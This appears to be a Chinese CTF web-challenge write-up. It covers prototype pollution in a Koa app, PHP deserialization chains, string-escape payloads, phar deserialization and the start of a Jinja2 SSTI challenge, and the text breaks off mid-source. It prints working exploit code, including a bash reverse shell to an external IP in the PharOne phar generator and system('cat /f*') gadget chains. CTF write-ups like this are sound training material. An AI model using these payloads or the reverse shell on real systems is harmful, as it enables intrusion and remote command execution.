&#125;);</span><br><span class="line">        ctx.body = &#123;</span><br><span class="line">            status: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">            data: data</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        console.error(e);</span><br><span class="line">        <span class="keyword">return</span> ctx.body = &#123;</span><br><span class="line">            status: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            msg: <span class="string">&quot;Internal Server Error&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span>.<span class="keyword">exports</span> = router;</span><br></pre></td></tr></table></figure>

<p>submit.js</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="variable">Router</span> <span class="operator">=</span> require(<span class="string">&quot;koa-router&quot;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">router</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="type">const</span> <span class="variable">SQL</span> <span class="operator">=</span> require(<span class="string">&quot;./sql&quot;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SQL</span>(<span class="string">&quot;wishes&quot;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">Base58</span> <span class="operator">=</span> require(<span class="string">&quot;base-58&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="variable">ALPHABET</span> <span class="operator">=</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="variable">rndText</span> <span class="operator">=</span> (length) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> Array.from(&#123; length &#125;, () =&gt; ALPHABET[Math.floor(Math.random() * ALPHABET.length)]).join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="variable">timeText</span> <span class="operator">=</span> (timestamp) =&gt; &#123;</span><br><span class="line">    timestamp = (typeof timestamp === <span class="string">&quot;number&quot;</span> ? timestamp : Date.now()).toString();</span><br><span class="line">    <span class="type">let</span> <span class="variable">text1</span> <span class="operator">=</span> timestamp.substring(<span class="number">0</span>, timestamp.length / <span class="number">2</span>);</span><br><span class="line">    <span class="type">let</span> <span class="variable">text2</span> <span class="operator">=</span> timestamp.substring(timestamp.length / <span class="number">2</span>)</span><br><span class="line">    <span class="type">let</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">let</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; text1.length; i++)</span><br><span class="line">        text += text1[i] + text2[text2.length - <span class="number">1</span> - i];</span><br><span class="line">    <span class="keyword">if</span> (text2.length &gt; text1.length) text += text2[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> Base58.encode(rndText(<span class="number">3</span>) + Buffer.from(text)); <span class="comment">// length = 20</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="variable">rndID</span> <span class="operator">=</span> (length, timestamp) =&gt; &#123;</span><br><span class="line">    <span class="type">const</span> <span class="variable">t</span> <span class="operator">=</span> timeText(timestamp);</span><br><span class="line">    <span class="keyword">if</span> (length &lt; t.length) <span class="keyword">return</span> t.substring(<span class="number">0</span>, length);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> t + rndText(length - t.length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function <span class="title function_">insert2db</span><span class="params">(data)</span> &#123;</span><br><span class="line">    <span class="type">let</span> <span class="variable">date</span> <span class="operator">=</span> String(data[<span class="string">&quot;date&quot;</span>]), place = String(data[<span class="string">&quot;place&quot;</span>]),</span><br><span class="line">        contact = String(data[<span class="string">&quot;contact&quot;</span>]), reason = String(data[<span class="string">&quot;reason&quot;</span>]);</span><br><span class="line">    <span class="type">const</span> <span class="variable">timestamp</span> <span class="operator">=</span> Date.now();</span><br><span class="line">    <span class="type">const</span> <span class="variable">wishid</span> <span class="operator">=</span> rndID(<span class="number">24</span>, timestamp);</span><br><span class="line">    await sql.run(`INSERT INTO <span class="title function_">wishes</span> <span class="params">(wishid, date, place, contact, reason, timestamp)</span> VALUES (?, ?, ?, ?, ?, ?)`,</span><br><span class="line">        [wishid, date, place, contact, reason, timestamp]).<span class="keyword">catch</span>(e =&gt; &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">    <span class="keyword">return</span> &#123; wishid, date, place, contact, reason, timestamp &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="variable">merge</span> <span class="operator">=</span> (dst, src) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeof dst !== <span class="string">&quot;object&quot;</span> || typeof src !== <span class="string">&quot;object&quot;</span>) <span class="keyword">return</span> dst;</span><br><span class="line">    <span class="keyword">for</span> (let key in src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key in dst &amp;&amp; key in src) &#123;</span><br><span class="line">            dst[key] = merge(dst[key], src[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dst[key] = src[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&quot;/submit&quot;</span>, async (ctx) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (ctx.header[<span class="string">&quot;content-type&quot;</span>] !== <span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.body = &#123;</span><br><span class="line">            status: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            msg: <span class="string">&quot;Content-Type must be application/json&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="variable">jsonText</span> <span class="operator">=</span> ctx.request.rawBody || <span class="string">&quot;&#123;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">const</span> <span class="variable">data</span> <span class="operator">=</span> JSON.parse(jsonText);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (typeof data[<span class="string">&quot;contact&quot;</span>] !== <span class="string">&quot;string&quot;</span> || typeof data[<span class="string">&quot;reason&quot;</span>] !== <span class="string">&quot;string&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> ctx.body = &#123;</span><br><span class="line">                status: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">                msg: <span class="string">&quot;Invalid parameter&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (data[<span class="string">&quot;contact&quot;</span>].length &lt;= <span class="number">0</span> || data[<span class="string">&quot;reason&quot;</span>].length &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> ctx.body = &#123;</span><br><span class="line">                status: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">                msg: <span class="string">&quot;Parameters contact and reason cannot be empty&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">const</span> <span class="variable">DEFAULT</span> <span class="operator">=</span> &#123;</span><br><span class="line">            date: <span class="string">&quot;unknown&quot;</span>,</span><br><span class="line">            place: <span class="string">&quot;unknown&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">const</span> <span class="variable">result</span> <span class="operator">=</span> await <span class="title function_">insert2db</span><span class="params">(merge(DEFAULT, data)</span>);</span><br><span class="line">        ctx.body = &#123;</span><br><span class="line">            status: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">            data: result</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        console.error(e);</span><br><span class="line">        ctx.body = &#123;</span><br><span class="line">            status: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            msg: <span class="string">&quot;Internal Server Error&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span>.<span class="keyword">exports</span> = router;</span><br></pre></td></tr></table></figure>

<p>比较关键的就是这两个文件内容</p>
<p>简单审计一下</p>
<p>它会将我们提交的内容展示出来 </p>
<p>并且会经过merge一个合并函数 熟人了</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166758715-338c47b1-47e3-4ac6-9785-be333a06fc3c.png" alt="img"></p>
<p>内容包括<code>data,place,contact,reason,timestamp(时间戳)</code></p>
<p>那么在这里需要污染的点是什么呢 </p>
<p>其实在这里给了提示</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166888157-91644cb2-2103-49b6-b72c-2175670971f3.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// Remove test data from before the movie was released</span><br></pre></td></tr></table></figure>

<p><code>“他会删除电影上映前的数据”</code> 也就是我们想要的数据在之前的时间里</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167165409-d0be8833-d256-44c9-a712-ad8cedc046cd.png" alt="img"></p>
<p>再看上面<code>||</code>条件语句 存在一个短路 默认min_public_time是2019-07-09</p>
<p>CONFIG.min_public_time默认是无的 不存在</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697274880739-9d9bc3d7-e83f-43d7-a46c-452764c272a1.png" alt="img"></p>
<p>如果<code>CONFIG.min_public_time</code>有值那么短路就不会<code>new default min_public_time</code>的值</p>
<p>那么就需要原型链污染去修改这个<code>CONFIG.min_public_time</code></p>
<p><code>min_public_time</code>在config.default文件 然后被引入的 格式是这样的</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167312141-c99bbfb6-154d-4920-aad1-2d15c7586b7a.png" alt="img"></p>
<p>只需要将这个时间改比它默认值小就行了</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167358763-2fd909df-fef3-4b62-bb20-85c359e4dfd3.png" alt="img"></p>
<p>为什么呢 因为我们之前提交数据的时候会有一个时间戳 这个最小时间戳的生成是由这个<code>CONFIG.min_public_time</code>影响的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();</span><br><span class="line">timestamp = Math.max(timestamp, minTimestamp);</span><br></pre></td></tr></table></figure>

<p>所以修改<code>CONFIG.min_public_time</code>就会修改最总时间戳 使其回到之前的时间就能将之前的数据读出来</p>
<p>然后根据代码逻辑 访问<code>/info/一个小值</code> 内容就被打印出来</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167409474-8c8f8358-af0f-44f2-8d83-ce6749dde650.png" alt="img"></p>
<h1 id="WEEK4"><a href="#WEEK4" class="headerlink" title="WEEK4"></a>WEEK4</h1><h2 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h2><p>考点：</p>
<ul>
<li>fast destruct</li>
</ul>
<p>exp</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Start</span>&#123;</span><br><span class="line">    public $errMsg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pwn</span>&#123;</span><br><span class="line">    public $obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Reverse</span>&#123;</span><br><span class="line">    public $func;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Web</span>&#123;</span><br><span class="line">    public $func;</span><br><span class="line">    public $var;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Crypto</span>&#123;</span><br><span class="line">    public $obj;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Misc</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line">$a-&gt;errMsg = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line">$a-&gt;errMsg-&gt;obj = <span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line">$a-&gt;errMsg-&gt;obj-&gt;func = <span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line">$a-&gt;errMsg-&gt;obj-&gt;func-&gt;obj = <span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line">$a-&gt;errMsg-&gt;obj-&gt;func-&gt;obj-&gt;<span class="keyword">var</span> = <span class="string">&quot;cat /f*&quot;</span>;</span><br><span class="line">$a-&gt;errMsg-&gt;obj-&gt;func-&gt;obj-&gt;func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">echo <span class="title function_">serialize</span>($a);</span><br><span class="line">#<span class="attr">O</span>:<span class="number">5</span>:<span class="string">&quot;Start&quot;</span>:<span class="number">1</span>:&#123;<span class="attr">s</span>:<span class="number">6</span>:<span class="string">&quot;errMsg&quot;</span>;<span class="attr">O</span>:<span class="number">6</span>:<span class="string">&quot;Crypto&quot;</span>:<span class="number">1</span>:&#123;<span class="attr">s</span>:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;<span class="attr">O</span>:<span class="number">7</span>:<span class="string">&quot;Reverse&quot;</span>:<span class="number">1</span>:&#123;<span class="attr">s</span>:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;<span class="attr">O</span>:<span class="number">3</span>:<span class="string">&quot;Pwn&quot;</span>:<span class="number">1</span>:&#123;<span class="attr">s</span>:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;<span class="attr">O</span>:<span class="number">3</span>:<span class="string">&quot;Web&quot;</span>:<span class="number">2</span>:&#123;<span class="attr">s</span>:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;<span class="attr">s</span>:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;<span class="attr">s</span>:<span class="number">3</span>:<span class="string">&quot;var&quot;</span>;<span class="attr">s</span>:<span class="number">7</span>:<span class="string">&quot;cat /f*&quot;</span>;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h2><p>一眼丁真 鉴定为反序列化字符串逃逸</p>
<p>考点：</p>
<ul>
<li>反序列化字符串逃逸</li>
</ul>
<p>从bad-&gt;good会多出一个字符 那么经过序列化-&gt;waf-&gt;反序列化就会有一个字符逃逸出来</p>
<p>举例执行whoami </p>
<p>将这一串塞入<code>&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code>那么就需要26个字符逃逸出来 那么就需要26个bad</p>
<p>paylaod：<code>badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code></p>
<p>其他命令根据字符个数改相应的bad个数调整即可</p>
<p>payload：<code>?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</code></p>
<h2 id="flask-disk"><a href="#flask-disk" class="headerlink" title="flask disk"></a>flask disk</h2><p>这道题我应该是非预期了</p>
<p>我的做法是 直接上传app.py 内容直接是python命令执行反弹shell </p>
<p>这样会覆盖题目的app.py 直接拿下</p>
<p>知识点：<code>flask开启了debug模式下，app.py源文件被修改后会立刻加载。  </code></p>
<h2 id="PharOne"><a href="#PharOne" class="headerlink" title="PharOne"></a>PharOne</h2><p>这道题太可惜了</p>
<p>一眼丁真就是phar反序列化利用</p>
<p>当时由于自己开了vpn 导致反弹shell一直过不来  错失良机</p>
<p>考点：</p>
<ul>
<li>phar反序列化</li>
</ul>
<p>首先给了恶意类</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span>(__FILE__);</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Flag</span>&#123;</span><br><span class="line">    public $cmd;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__destruct</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        @<span class="title function_">exec</span>($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_">unlink</span>($_POST[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>先生成一个phar文件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Flag</span>&#123;</span><br><span class="line">    public $cmd;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__destruct</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        @<span class="title function_">exec</span>($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line">$a-&gt;cmd = <span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/8.130.34.53/7777 0&gt;&amp;1&quot;&#x27;</span>;</span><br><span class="line">@<span class="title function_">unlink</span>(<span class="string">&quot;Z1d10t.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;Z1d10t.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;<span class="title function_">startBuffering</span>();</span><br><span class="line">$phar-&gt;<span class="title function_">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;<span class="title function_">setMetadata</span>($a); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;<span class="title function_">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;<span class="title function_">stopBuffering</span>(); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>上传上去之后显示过滤了__HALT_COMPILER</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697642632042-0e857bfb-849f-4ca9-96eb-8ab35051a90b.png" alt="img"></p>
<p>可以通过gzip压缩绕过 来自：<a target="_blank" rel="noopener" href="https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">php(phar)反序列化漏洞及各种绕过姿势</a><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697642675212-31124284-5660-49f3-8ded-02d920345766.png" alt="img"></p>
<p>然后还会检测上传文件后缀名以及mine </p>
<p>当然phar文件后缀名是无关紧要的 不是<code>.phar</code>照样能解析</p>
<p>所以将打包的压缩包改为任意后缀名都行</p>
<p>然后注意这里<code>phar://</code>协议要到<code>Z1d10t.phar</code></p>
<p>上传上去之后<code>file=phar://upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg/Z1d10t.phar</code></p>
<p>记得关vpn 哭死</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697642947630-648bd479-d31a-42a1-a3db-e854baf8d485.png" alt="img"></p>
<h2 id="InjectMe"><a href="#InjectMe" class="headerlink" title="InjectMe"></a>InjectMe</h2><p>考点:</p>
<ul>
<li>jinja2 ssti</li>
</ul>
<p>首先是任意文件读取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/download?file=/app/app.py</span><br></pre></td></tr></table></figure>

<p>获得源码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> <span class="title class_">Flask</span>, render_template, request, abort, send_file, session, render_template_string</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> secret_key</span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line">app.<span class="property">secret_key</span> = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_">hello_world</span>():  # put application<span class="string">&#x27;s code here</span></span><br><span class="line"><span class="string">    return render_template(&#x27;</span>index.<span class="property">html</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&quot;/cancanneed&quot;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="string">def cancanneed():</span></span><br><span class="line"><span class="string">    all_filename = os.listdir(&#x27;</span>./<span class="keyword">static</span>/img/<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    filename = request.args.get(&#x27;</span>file<span class="string">&#x27;, &#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    if filename:</span></span><br><span class="line"><span class="string">        return render_template(&#x27;</span>img.<span class="property">html</span><span class="string">&#x27;, filename=filename, all_filename=all_filename)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        return f&quot;&#123;str(os.listdir(&#x27;</span>./<span class="keyword">static</span>/img/<span class="string">&#x27;))&#125; &lt;br&gt; &lt;a href=\&quot;/cancanneed?file=1.jpg\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&quot;/download&quot;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="string">def download():</span></span><br><span class="line"><span class="string">    filename = request.args.get(&#x27;</span>file<span class="string">&#x27;, &#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    if filename:</span></span><br><span class="line"><span class="string">        filename = filename.replace(&#x27;</span>../<span class="string">&#x27;, &#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        filename = os.path.join(&#x27;</span><span class="keyword">static</span>/img/<span class="string">&#x27;, filename)</span></span><br><span class="line"><span class="string">        print(filename)</span></span><br><span class="line"><span class="string">        if (os.path.exists(filename)) and (&quot;start&quot; not in filename):</span></span><br><span class="line"><span class="string">            return send_file(filename)</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            abort(500)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        abort(404)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;</span>/backdoor<span class="string">&#x27;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="string">def backdoor():</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        print(session.get(&quot;user&quot;))</span></span><br><span class="line"><span class="string">        if session.get(&quot;user&quot;) is None:</span></span><br><span class="line"><span class="string">            session[&#x27;</span>user<span class="string">&#x27;] = &quot;guest&quot;</span></span><br><span class="line"><span class="string">        name = session.get(&quot;user&quot;)</span></span><br><span class="line"><span class="string">        if re.findall(</span></span><br><span class="line"><span class="string">                r&#x27;</span>__|&#123;&#123;|<span class="keyword">class</span>|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|<span 